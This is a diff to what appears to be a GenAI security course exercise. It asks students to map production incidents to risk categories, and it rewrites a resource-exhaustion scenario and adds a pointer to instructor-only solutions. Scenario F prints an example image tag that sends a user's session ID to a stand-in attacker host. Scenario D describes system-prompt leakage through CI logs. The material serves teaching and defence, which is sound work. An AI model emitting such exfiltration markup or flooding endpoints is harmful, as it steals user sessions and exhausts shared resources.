@@ -99,7 +99,7 @@ Below are 8 scenarios observed in production GenAI systems. Map each to the most
 
 **Scenario D:** The CI/CD pipeline logs include the full system prompt, which contains the customer escalation routing rules and an internal API endpoint.
 
-**Scenario E:** A user sends a 150,000-token prompt to the chatassist-4 endpoint (which has a 128,000-token context window). The API processes the first 128,000 tokens before returning an error, consuming significant compute resources.
+**Scenario E:** A user sends thousands of short requests in rapid succession to the chatassist-4 endpoint, each containing near-maximum token counts (127,000 tokens). The requests are within the context window limit, so they are all processed, consuming significant compute resources and exhausting the token-per-minute quota.
 
 **Scenario F:** The model generates a response that includes `<img src="https://attacker.example/log?data=USER_SESSION_ID">`. When rendered in the chat UI, the user's session ID is sent to the attacker.
 
@@ -119,3 +119,7 @@ For each scenario:
 - Were any scenarios ambiguous (could map to multiple categories)?
 - Which of these scenarios would be caught by the tests you designed in Exercise 1?
 - Which scenarios are hardest to test for automatically?
+
+---
+
+> **Solutions:** See `solutions/05-solutions.md` (instructor only).
